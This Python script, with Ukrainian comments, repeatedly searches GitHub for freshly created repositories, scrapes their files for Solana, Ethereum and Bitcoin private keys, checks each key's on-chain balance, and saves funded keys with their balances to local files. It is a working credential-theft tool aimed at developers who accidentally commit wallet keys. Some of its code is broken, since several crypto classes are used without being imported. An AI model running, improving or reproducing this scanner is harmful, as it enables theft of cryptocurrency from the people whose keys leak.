# -*- coding: utf-8 -*-
import aiohttp
import asyncio
import base58
import re
import json
import logging
from urllib.parse import quote
from dotenv import load_dotenv
import os
from datetime import datetime, timedelta, timezone
from solders.keypair import Keypair
import hashlib
import binascii

# Налаштування логування
repo_logger = logging.getLogger('repo')
repo_logger.setLevel(logging.INFO)
repo_handler = logging.FileHandler('scanner_repos.log', encoding='utf-8')
repo_handler.setFormatter(logging.Formatter('%(message)s'))
repo_logger.addHandler(repo_handler)

info_error_logger = logging.getLogger('info_error')
info_error_logger.setLevel(logging.INFO)
info_error_handler = logging.FileHandler('scanner_info_errors.log', encoding='utf-8')
info_error_handler.setFormatter(logging.Formatter('%(asctime)s - %(levelname)s - %(message)s'))
info_error_logger.addHandler(info_error_handler)

# Завантаження змінних із .env
load_dotenv()

# Конфігурація
GITHUB_TOKEN = os.getenv("GITHUB_TOKEN")
HELIUS_API_KEY = os.getenv("HELIUS_API_KEY")
ETHERSCAN_API_KEY = os.getenv("ETHERSCAN_API_KEY")

if not GITHUB_TOKEN:
    raise ValueError("GITHUB_TOKEN not found in .env file")
if not HELIUS_API_KEY:
    info_error_logger.warning("HELIUS_API_KEY not found. Solana balance checking disabled.")
    print("Warning: HELIUS_API_KEY not found. Solana balance checking disabled.")
    SOLANA_AVAILABLE = False
else:
    SOLANA_AVAILABLE = True
if not ETHERSCAN_API_KEY:
    info_error_logger.warning("ETHERSCAN_API_KEY not found. Ethereum balance checking disabled.")
    print("Warning: ETHERSCAN_API_KEY not found. Ethereum balance checking disabled.")
    ETH_AVAILABLE = False
else:
    ETH_AVAILABLE = True
BTC_AVAILABLE = True  # Blockchain.info не потребує API-ключа

# Створення директорій для вихідних файлів і логів
OUTPUT_DIR = "../keys"
LOG_DIR = "../logs"
os.makedirs(OUTPUT_DIR, exist_ok=True)
os.makedirs(LOG_DIR, exist_ok=True)

OUTPUT_FILES = {
    "solana": os.path.join(OUTPUT_DIR, "solana_keys.txt"),
    "ethereum": os.path.join(OUTPUT_DIR, "eth_keys.txt"),
    "bitcoin": os.path.join(OUTPUT_DIR, "btc_keys.txt")
}
HEADERS = {
    "Authorization": f"token {GITHUB_TOKEN}",
    "Accept": "application/vnd.github.v3+json"
}
BASE_URL = "https://api.github.com"
SOLANA_RPC = f"https://mainnet.helius-rpc.com/?api-key={HELIUS_API_KEY}"
ETHERSCAN_API = "https://api.etherscan.io/api"
BLOCKCHAIN_INFO_API = "https://blockchain.info"
REPO_SCAN_TIMEOUT = 10
CRYPTO_REQUEST_TIMEOUT = 5
RECENT_MINUTES = 1  # 1 хвилина
SUB_INTERVAL_SECONDS = 5  # 5-секундні піддіапазони
QUEUE_INTERVAL_SECONDS = 60  # Нова черга кожну хвилину
MAX_CONCURRENT_SCANS = 5  # Максимум 5 паралельних сканувань
PAGE_DELAY_SECONDS = 5  # Затримка між сторінками

CRYPTO_PRICES = {
    "solana": 150.0,
    "ethereum": 2500.0,
    "bitcoin": 60000.0
}

FOUND_KEYS = set()
PROCESSED_REPOS = set()
SEEN_REPO_IDS = set()
REPO_COUNT = 0
FOUND_KEYS_LOCK = asyncio.Lock()  # Лок для синхронізації FOUND_KEYS

# Завантаження оброблених репозиторіїв із scanner_repos.log
def load_processed_repos():
    repo_log_path = os.path.join(LOG_DIR, "scanner_repos.log")
    if not os.path.exists(repo_log_path):
        info_error_logger.info("scanner_repos.log not found, starting with empty PROCESSED_REPOS")
        print("scanner_repos.log not found, starting with empty PROCESSED_REPOS")
        return
    try:
        with open(repo_log_path, "r", encoding="utf-8") as f:
            for line in f:
                # Формат: "X - YYYY-MM-DD HH:MM:SS - Scanning repo_name (created: ...)"
                parts = line.strip().split(" - ")
                if len(parts) >= 3 and parts[2].startswith("Scanning "):
                    repo_name = parts[2].split(" (")[0].replace("Scanning ", "")
                    PROCESSED_REPOS.add(repo_name)
        info_error_logger.info(f"Loaded {len(PROCESSED_REPOS)} processed repositories from scanner_repos.log")
        print(f"Loaded {len(PROCESSED_REPOS)} processed repositories from scanner_repos.log")
    except Exception as e:
        info_error_logger.error(f"Error loading scanner_repos.log: {e}")
        print(f"Error loading scanner_repos.log: {e}")

# Виклик функції завантаження при запуску
load_processed_repos()

def is_hex_key(data):
    hex_pattern = r"^[0-9a-fA-F]{64}$"
    if not bool(re.match(hex_pattern, data)):
        return False
    if data == "0000000000000000000000000000000000000000000000000000000000000000":
        info_error_logger.info(f"Skipping known test key: {data}")
        print(f"Skipping known test key: {data[:8]}...")
        return False
    return True

def is_btc_wif_key(data):
    wif_pattern = r"^[5KL][1-9A-HJ-NP-Za-km-z]{50,51}$"
    if not bool(re.match(wif_pattern, data)):
        return False
    try:
        decoded = base58.b58decode(data)
        if len(decoded) not in [33, 34]:
            return False
        if decoded[0] != 0x80:
            return False
        return True
    except:
        return False

def is_byte_array_key(data):
    byte_array_pattern = r"\[\s*(?:\d{1,3}\s*,?\s*){32}\s*\]"
    if not bool(re.match(byte_array_pattern, data)):
        return False
    try:
        cleaned = data.strip("[]").replace(" ", "")
        bytes_list = [int(x) for x in cleaned.split(",") if x]
        if len(bytes_list) != 32:
            return False
        hex_key = "".join([format(b, "02x") for b in bytes_list])
        if is_hex_key(hex_key):
            return hex_key
        return False
    except:
        return False

def private_key_to_sol_address(private_key):
    if not SOLANA_AVAILABLE:
        return None
    try:
        private_key_bytes = bytes.fromhex(private_key)
        keypair = Keypair.from_seed(private_key_bytes[:32])
        return str(keypair.pubkey())
    except Exception as e:
        info_error_logger.error(f"Error converting private key to SOL address: {e}")
        print(f"Error converting private key to SOL address: {e}")
        return None

def private_key_to_eth_address(private_key):
    if not ETH_AVAILABLE:
        return None
    try:
        account = Account.from_key(f"0x{private_key}")
        return account.address
    except Exception as e:
        info_error_logger.error(f"Error converting private key to ETH address: {e}")
        print(f"Error converting private key to ETH address: {e}")
        return None

def private_key_to_btc_address(private_key, is_wif=False):
    if not BTC_AVAILABLE:
        return None
    try:
        if is_wif:
            decoded = base58.b58decode(private_key)
            private_key_hex = decoded[1:-4].hex()
        else:
            private_key_hex = private_key
        sk = SigningKey.from_string(bytes.fromhex(private_key_hex), curve=SECP256k1)
        vk = sk.verifying_key
        public_key = b'\x04' + vk.to_string()
        sha256_hash = hashlib.sha256(public_key).digest()
        ripemd160 = hashlib.new('ripemd160')
        ripemd160.update(sha256_hash)
        hashed_public_key = ripemd160.digest()
        versioned_key = b'\x00' + hashed_public_key
        checksum = hashlib.sha256(hashlib.sha256(versioned_key).digest()).digest()[:4]
        address = base58.b58encode(versioned_key + checksum)
        return address.decode('utf-8')
    except Exception as e:
        info_error_logger.error(f"Error converting private key to BTC address: {e}")
        print(f"Error converting private key to BTC address: {e}")
        return None

async def get_balance(session, private_key, is_hex=False, is_byte_array=False, is_wif=False):
    balances = {}
    if is_hex or is_byte_array:
        # Solana
        if SOLANA_AVAILABLE:
            print(f"Checking Solana balance for key: {private_key[:8]}...")
            sol_address = private_key_to_sol_address(private_key)
            if sol_address:
                try:
                    async with session.post(
                        SOLANA_RPC,
                        json={
                            "jsonrpc": "2.0",
                            "id": 1,
                            "method": "getBalance",
                            "params": [sol_address]
                        },
                        timeout=CRYPTO_REQUEST_TIMEOUT
                    ) as response:
                        if response.status == 200:
                            data = await response.json()
                            balance_lamports = data.get("result", {}).get("value", 0)
                            balance_sol = balance_lamports / 1_000_000_000
                            usd_value = balance_sol * CRYPTO_PRICES["solana"]
                            balances["SOL"] = balance_sol
                            print(f"Solana balance: {balance_sol:.8f} SOL (${usd_value:.2f})")
                        else:
                            info_error_logger.warning(f"Failed to check SOL balance for {sol_address}: {response.status}")
                            print(f"Failed to check SOL balance: {response.status}")
                except asyncio.TimeoutError:
                    info_error_logger.warning(f"Timeout checking SOL balance for {sol_address}: exceeded {CRYPTO_REQUEST_TIMEOUT} seconds")
                    print(f"Timeout checking SOL balance for {sol_address}: exceeded {CRYPTO_REQUEST_TIMEOUT} seconds")
                except Exception as e:
                    info_error_logger.error(f"Error checking SOL balance for {sol_address}: {e}")
                    print(f"Error checking SOL balance: {e}")

        # Ethereum
        if ETH_AVAILABLE:
            print(f"Checking Ethereum balance for key: {private_key[:8]}...")
            eth_address = private_key_to_eth_address(private_key)
            if eth_address:
                try:
                    async with session.get(
                        f"{ETHERSCAN_API}?module=account&action=balance&address={eth_address}&tag=latest&apikey={ETHERSCAN_API_KEY}",
                        timeout=CRYPTO_REQUEST_TIMEOUT
                    ) as response:
                        if response.status == 200:
                            data = await response.json()
                            if data.get("status") == "1":
                                balance_wei = int(data.get("result", 0))
                                balance_eth = balance_wei / 1_000_000_000_000_000_000
                                usd_value = balance_eth * CRYPTO_PRICES["ethereum"]
                                balances["ETH"] = balance_eth
                                print(f"Ethereum balance: {balance_eth:.8f} ETH (${usd_value:.2f})")
                            else:
                                info_error_logger.warning(f"Failed to check ETH balance for {eth_address}: {data.get('message')}")
                                print(f"Failed to check ETH balance: {data.get('message')}")
                        else:
                            info_error_logger.warning(f"Failed to check ETH balance for {eth_address}: {response.status}")
                            print(f"Failed to check ETH balance: {response.status}")
                except asyncio.TimeoutError:
                    info_error_logger.warning(f"Timeout checking ETH balance for {eth_address}: exceeded {CRYPTO_REQUEST_TIMEOUT} seconds")
                    print(f"Timeout checking ETH balance for {eth_address}: exceeded {CRYPTO_REQUEST_TIMEOUT} seconds")
                except Exception as e:
                    info_error_logger.error(f"Error checking ETH balance for {eth_address}: {e}")
                    print(f"Error checking ETH balance: {e}")

    if is_wif or (is_hex and not balances):
        # Bitcoin
        if BTC_AVAILABLE:
            print(f"Checking Bitcoin balance for key: {private_key[:8 if is_hex else 4]}...")
            btc_address = private_key_to_btc_address(private_key, is_wif=is_wif)
            if btc_address:
                try:
                    async with session.get(
                        f"{BLOCKCHAIN_INFO_API}/q/addressbalance/{btc_address}",
                        timeout=CRYPTO_REQUEST_TIMEOUT
                    ) as response:
                        if response.status == 200:
                            balance_satoshi = int(await response.text())
                            balance_btc = balance_satoshi / 100_000_000
                            usd_value = balance_btc * CRYPTO_PRICES["bitcoin"]
                            balances["BTC"] = balance_btc
                            print(f"Bitcoin balance: {balance_btc:.8f} BTC (${usd_value:.2f})")
                        else:
                            info_error_logger.warning(f"Failed to check BTC balance for {btc_address}: {response.status}")
                            print(f"Failed to check BTC balance: {response.status}")
                except asyncio.TimeoutError:
                    info_error_logger.warning(f"Timeout checking BTC balance for {btc_address}: exceeded {CRYPTO_REQUEST_TIMEOUT} seconds")
                    print(f"Timeout checking BTC balance for {btc_address}: exceeded {CRYPTO_REQUEST_TIMEOUT} seconds")
                except Exception as e:
                    info_error_logger.error(f"Error checking BTC balance for {btc_address}: {e}")
                    print(f"Error checking BTC balance: {e}")

    return balances

async def scan_file_content(session, file_url, repo_name):
    try:
        async with session.get(file_url, headers=HEADERS) as response:
            if response.status != 200:
                info_error_logger.warning(f"Failed to fetch file {file_url}: {response.status}")
                print(f"Warning: Failed to fetch file {file_url}: {response.status}")
                return []
            content = await response.text()
    except Exception as e:
        info_error_logger.error(f"Error fetching file {file_url}: {e}")
        print(f"Error fetching file {file_url}: {e}")
        return []

    found_keys = []

    # Hex ключі (Solana, ETH, BTC)
    hex_candidates = re.findall(r"(?:private_key\s*=\s*|key\s*=\s*|#|//|\s)([0-9a-fA-F]{64})(?:\s|$)", content, re.IGNORECASE)
    for candidate in hex_candidates:
        info_error_logger.info(f"Test: Hex candidate: {candidate}")
        if is_hex_key(candidate):
            async with FOUND_KEYS_LOCK:
                if candidate in FOUND_KEYS:
                    info_error_logger.info(f"Skipping duplicate Hex key in {repo_name}: {candidate}")
                    print(f"Skipping duplicate Hex key in {repo_name}: {candidate[:8]}...")
                    continue
                FOUND_KEYS.add(candidate)
            print(f"Found Hex key in {repo_name}: {candidate[:8]}...")
            balances = await get_balance(session, candidate, is_hex=True)
            found_keys.append({
                "key": candidate,
                "repo": repo_name,
                "balances": balances,
                "type": "hex"
            })
            info_error_logger.info(f"Found Hex key in {repo_name}: {candidate} with balances {balances}")

    # BTC WIF ключі
    wif_candidates = re.findall(r"(?:private_key\s*=\s*|key\s*=\s*|#|//|\s)([5KL][1-9A-HJ-NP-Za-km-z]{50,51})(?:\s|$)", content, re.IGNORECASE)
    for candidate in wif_candidates:
        info_error_logger.info(f"Test: WIF candidate: {candidate}")
        if is_btc_wif_key(candidate):
            async with FOUND_KEYS_LOCK:
                if candidate in FOUND_KEYS:
                    info_error_logger.info(f"Skipping duplicate WIF key in {repo_name}: {candidate}")
                    print(f"Skipping duplicate WIF key in {repo_name}: {candidate[:4]}...")
                    continue
                FOUND_KEYS.add(candidate)
            print(f"Found WIF key in {repo_name}: {candidate[:4]}...")
            balances = await get_balance(session, candidate, is_wif=True)
            found_keys.append({
                "key": candidate,
                "repo": repo_name,
                "balances": balances,
                "type": "wif"
            })
            info_error_logger.info(f"Found WIF key in {repo_name}: {candidate} with balances {balances}")

    # Byte array ключі (Solana)
    byte_array_candidates = re.findall(r"\[\s*(?:\d{1,3}\s*,?\s*){32}\s*\]", content)
    for candidate in byte_array_candidates:
        info_error_logger.info(f"Test: Byte array candidate: {candidate}")
        hex_key = is_byte_array_key(candidate)
        if hex_key:
            async with FOUND_KEYS_LOCK:
                if hex_key in FOUND_KEYS:
                    info_error_logger.info(f"Skipping duplicate byte array key in {repo_name}: {candidate} (hex: {hex_key})")
                    print(f"Skipping duplicate byte array key in {repo_name}: {candidate[:20]}... (hex: {hex_key[:8]}...)")
                    continue
                FOUND_KEYS.add(hex_key)
            print(f"Found byte array key in {repo_name}: {candidate[:20]}... (hex: {hex_key[:8]}...)")
            balances = await get_balance(session, hex_key, is_byte_array=True)
            found_keys.append({
                "key": hex_key,
                "repo": repo_name,
                "balances": balances,
                "type": "byte_array"
            })
            info_error_logger.info(f"Found byte array key in {repo_name}: {candidate} (hex: {hex_key}) with balances {balances}")

    return found_keys

async def scan_repository(session, repo):
    global REPO_COUNT
    repo_name = repo["full_name"]
    async with FOUND_KEYS_LOCK:
        if repo_name in PROCESSED_REPOS:
            info_error_logger.info(f"Skipping already processed repository: {repo_name}")
            print(f"Skipping already processed repository: {repo_name}")
            return []
        PROCESSED_REPOS.add(repo_name)

    REPO_COUNT += 1
    created_at = repo.get("created_at", "N/A")
    repo_logger.info(f"{REPO_COUNT} - {datetime.now(timezone.utc).strftime('%Y-%m-%d %H:%M:%S')} - Scanning {repo_name} (created: {created_at})")
    print(f"Scanning {repo_name} (created: {created_at})")

    contents_url = f"{BASE_URL}/repos/{repo_name}/contents"
    try:
        async with session.get(contents_url, headers=HEADERS, timeout=REPO_SCAN_TIMEOUT) as response:
            if response.status != 200:
                info_error_logger.warning(f"Failed to fetch contents for {repo_name}: {response.status}")
                print(f"Warning: Failed to fetch contents for {repo_name}: {response.status}")
                return []
            contents = await response.json()
    except asyncio.TimeoutError:
        info_error_logger.warning(f"Timeout fetching contents for {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
        print(f"Timeout fetching contents for {repo_name}: exceeded {REPO_SCAN_TIMEOUT} seconds")
        return []
    except Exception as e:
        info_error_logger.error(f"Error fetching contents for {repo_name}: {e}")
        print(f"Error fetching contents for {repo_name}: {e}")
        return []

    found_keys = []
    tasks = []
    for item in contents:
        if item["type"] == "file" and item["name"].endswith((".py", ".txt", ".json", ".js", ".ts", ".env", ".yaml", ".conf", ".ini")) and not item["name"].lower() == "readme.md":
            file_url = item["download_url"]
            if file_url:
                tasks.append(scan_file_content(session, file_url, repo_name))

    results = await asyncio.gather(*tasks, return_exceptions=True)
    for result in results:
        if isinstance(result, list):
            found_keys.extend(result)

    return found_keys

async def save_keys(keys):
    if not keys:
        return
    saved_count = 0
    for key_info in keys:
        key = key_info["key"]
        repo = key_info["repo"]
        balances = key_info["balances"]
        key_type = key_info["type"]

        async with FOUND_KEYS_LOCK:
            if key not in FOUND_KEYS:
                info_error_logger.warning(f"Attempted to save non-registered key {key[:8]}... from {repo}")
                continue

        # Solana (hex, byte_array)
        if (key_type in ["hex", "byte_array"] and "SOL" in balances and SOLANA_AVAILABLE):
            balance = balances.get("SOL", 0)
            usd_value = balance * CRYPTO_PRICES["solana"]
            balance_str = f"SOL: {balance:.8f} (${usd_value:.2f} USD)"
            with open(OUTPUT_FILES["solana"], "a", encoding="utf-8") as f:
                f.write(f"{key} | {balance_str} | Type: {key_type} | Repo: {repo}\n")
            info_error_logger.info(f"Saved SOL key to {OUTPUT_FILES['solana']}: {key[:8]}... with balance {balance_str}")
            saved_count += 1

        # Ethereum (hex)
        if (key_type == "hex" and "ETH" in balances and ETH_AVAILABLE):
            balance = balances.get("ETH", 0)
            usd_value = balance * CRYPTO_PRICES["ethereum"]
            balance_str = f"ETH: {balance:.8f} (${usd_value:.2f} USD)"
            with open(OUTPUT_FILES["ethereum"], "a", encoding="utf-8") as f:
                f.write(f"{key} | {balance_str} | Type: {key_type} | Repo: {repo}\n")
            info_error_logger.info(f"Saved ETH key to {OUTPUT_FILES['ethereum']}: {key[:8]}... with balance {balance_str}")
            saved_count += 1

        # Bitcoin (hex, wif)
        if ((key_type in ["hex", "wif"] and "BTC" in balances and BTC_AVAILABLE) or
            (key_type == "wif" and BTC_AVAILABLE)):
            balance = balances.get("BTC", 0)
            usd_value = balance * CRYPTO_PRICES["bitcoin"]
            balance_str = f"BTC: {balance:.8f} (${usd_value:.2f} USD)"
            with open(OUTPUT_FILES["bitcoin"], "a", encoding="utf-8") as f:
                f.write(f"{key} | {balance_str} | Type: {key_type} | Repo: {repo}\n")
            info_error_logger.info(f"Saved BTC key to {OUTPUT_FILES['bitcoin']}: {key[:8 if key_type == 'hex' else 4]}... with balance {balance_str}")
            saved_count += 1

    if saved_count > 0:
        print(f"Saved {saved_count} keys to respective files")
    else:
        print("No new keys saved")

async def fetch_repos_to_queue(session, repo_queue, start_time, end_time):
    max_pages = 10
    start_time_str = start_time.strftime("%Y-%m-%dT%H:%M:%SZ")
    end_time_str = end_time.strftime("%Y-%m-%dT%H:%M:%SZ")
    search_query = f"code language:python+language:javascript+created:{start_time_str}..{end_time_str}"
    encoded_query = quote(search_query)
    info_error_logger.info(f"Query: {search_query}")
    print(f"Query: {search_query}")
    if len(encoded_query) > 256:
        info_error_logger.error(f"Query too long: {len(encoded_query)} characters")
        print(f"Error: Query too long: {len(encoded_query)} characters")
        return
    search_url = f"{BASE_URL}/search/repositories?q={encoded_query}&sort=created&order=desc"
    print(f"Fetching repositories with query: {search_query}...")
    info_error_logger.info(f"Fetching repositories with query: {search_query}...")
    page = 1
    while page <= max_pages:
        try:
            async with session.get(f"{search_url}&page={page}&per_page=100", headers=HEADERS) as response:
                if response.status == 403 and "rate limit exceeded" in (await response.text()).lower():
                    reset_time = int(response.headers.get("X-RateLimit-Reset", 0))
                    if reset_time:
                        wait_seconds = max(60, reset_time - int(datetime.now(timezone.utc).timestamp()) + 5)
                        info_error_logger.warning(f"API rate limit exceeded, waiting {wait_seconds} seconds until reset")
                        print(f"API rate limit exceeded, waiting {wait_seconds} seconds until reset...")
                        await asyncio.sleep(wait_seconds)
                    else:
                        info_error_logger.warning("API rate limit exceeded, pausing for 60 seconds")
                        print("API rate limit exceeded, pausing for 60 seconds...")
                        await asyncio.sleep(60)
                    continue
                if response.status != 200:
                    error_text = await response.text()
                    info_error_logger.error(f"Error fetching repositories: {response.status}, Response: {error_text}")
                    print(f"Error fetching repositories: {response.status}, Response: {error_text}")
                    break
                remaining = response.headers.get("X-RateLimit-Remaining", "unknown")
                info_error_logger.info(f"API requests remaining: {remaining}")
                print(f"API requests remaining: {remaining}")
                if remaining != "unknown" and int(remaining) < 10:
                    reset_time = int(response.headers.get("X-RateLimit-Reset", 0))
                    if reset_time:
                        wait_seconds = max(60, reset_time - int(datetime.now(timezone.utc).timestamp()) + 5)
                        info_error_logger.warning(f"Low API rate limit ({remaining}), waiting {wait_seconds} seconds until reset")
                        print(f"Low API rate limit ({remaining}), waiting {wait_seconds} seconds until reset...")
                        await asyncio.sleep(wait_seconds)
                    else:
                        info_error_logger.warning("Low API rate limit, pausing for 60 seconds")
                        print("Low API rate limit, pausing for 60 seconds...")
                        await asyncio.sleep(60)
                data = await response.json()
                total_count = data.get("total_count", 0)
                page_repos = data.get("items", [])
                info_error_logger.info(f"Page {page}: total_count={total_count}, repos={len(page_repos)}")
                print(f"Page {page}: total_count={total_count}, repos={len(page_repos)}")
                if total_count > 1000:
                    info_error_logger.warning(f"Search results exceed 1000 ({total_count}), processing current page")
                    print(f"Warning: Search results exceed 1000 ({total_count}), processing current page")
                    info_error_logger.info(f"API response: {json.dumps(data, indent=2)}")
                if not page_repos:
                    info_error_logger.info(f"No more repositories on page {page}, stopping pagination")
                    print(f"No more repositories on page {page}, stopping pagination")
                    break

                filtered_repos = []
                async with FOUND_KEYS_LOCK:
                    for repo in page_repos:
                        repo_id = repo["id"]
                        repo_name = repo["full_name"]
                        if repo_id not in SEEN_REPO_IDS and repo_name not in PROCESSED_REPOS:
                            SEEN_REPO_IDS.add(repo_id)
                            filtered_repos.append(repo)
                            await repo_queue.put(repo)
                            created_at = repo.get("created_at", "N/A")
                            info_error_logger.info(f"Queued repo: {repo_name}, created_at: {created_at}")
                            print(f"Queued repo: {repo_name}, created_at: {created_at}")

                info_error_logger.info(f"Queued {len(filtered_repos)} repositories from page {page}")
                print(f"Queued {len(filtered_repos)} repositories from page {page}")

        except Exception as e:
            info_error_logger.error(f"Error fetching repositories on page {page}: {e}")
            print(f"Error fetching repositories on page {page}: {e}")
            break
        page += 1
        await asyncio.sleep(PAGE_DELAY_SECONDS)

async def process_queue(session, repo_queue):
    tasks = []
    while not repo_queue.empty():
        repo = await repo_queue.get()
        tasks.append(asyncio.create_task(scan_repository(session, repo)))
        if len(tasks) >= MAX_CONCURRENT_SCANS:
            results = await asyncio.gather(*tasks, return_exceptions=True)
            for result in results:
                if isinstance(result, list) and result:
                    await save_keys(result)
            tasks = []
        repo_queue.task_done()
    if tasks:
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, list) and result:
                await save_keys(result)
        for task in tasks:
            repo_queue.task_done()

async def main():
    async with aiohttp.ClientSession() as session:
        cycle_count = 0
        while True:
            try:
                cycle_count += 1
                info_error_logger.info(f"Starting cycle {cycle_count}")
                print(f"Starting cycle {cycle_count}")

                # Створюємо нову чергу
                repo_queue = asyncio.Queue()
                current_time = datetime.now(timezone.utc)
                start_time = current_time - timedelta(minutes=RECENT_MINUTES)

                # Розбиття хвилинного діапазону на 5-секундні піддіапазони
                sub_intervals = []
                interval_start = start_time
                while interval_start < current_time:
                    interval_end = min(interval_start + timedelta(seconds=SUB_INTERVAL_SECONDS), current_time)
                    sub_intervals.append((interval_start, interval_end))
                    interval_start = interval_end

                info_error_logger.info(f"Creating queue with {len(sub_intervals)} sub-intervals")
                print(f"Creating queue with {len(sub_intervals)} sub-intervals")

                # Заповнення черги репозиторіями
                for start, end in sub_intervals:
                    await fetch_repos_to_queue(session, repo_queue, start, end)

                # Обробка черги до завершення
                info_error_logger.info(f"Processing queue with {repo_queue.qsize()} repositories")
                print(f"Processing queue with {repo_queue.qsize()} repositories")
                await process_queue(session, repo_queue)

                info_error_logger.info(f"Completed queue processing, processed {REPO_COUNT} repositories")
                print(f"Completed queue processing, processed {REPO_COUNT} repositories")

                # Чекаємо до наступної хвилини
                next_cycle = (current_time + timedelta(minutes=1)).replace(second=0, microsecond=0)
                wait_seconds = (next_cycle - datetime.now(timezone.utc)).total_seconds()
                if wait_seconds > 0:
                    info_error_logger.info(f"Waiting {wait_seconds:.2f} seconds for next cycle")
                    print(f"Waiting {wait_seconds:.2f} seconds for next cycle")
                    await asyncio.sleep(wait_seconds)
                else:
                    info_error_logger.info("No wait needed, starting next cycle immediately")
                    print("No wait needed, starting next cycle immediately")

            except Exception as e:
                info_error_logger.error(f"Critical error in main loop: {e}")
                print(f"Critical error in main loop: {e}")
                info_error_logger.info(f"Retrying in 60 seconds...")
                print(f"Retrying in 60 seconds...")
                await asyncio.sleep(60)

if __name__ == "__main__":
    asyncio.run(main())